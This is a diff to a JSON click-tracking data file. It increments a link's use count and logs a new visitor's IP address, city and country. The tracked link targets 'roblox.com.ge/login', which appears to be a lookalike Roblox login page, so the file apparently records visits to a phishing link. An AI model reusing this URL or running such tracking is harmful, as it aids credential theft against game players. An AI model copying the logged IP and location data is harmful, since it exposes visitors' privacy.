@@ -110,7 +110,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 815,
+    "useCount": 816,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6632,6 +6632,14 @@
         "city": "Mejía de Navarrete",
         "flag": "🇩🇴",
         "countryCode": "DO"
+      },
+      {
+        "timestamp": 1777171727918,
+        "ip": "143.44.133.156",
+        "country": "Philippines",
+        "city": "San Antonio",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
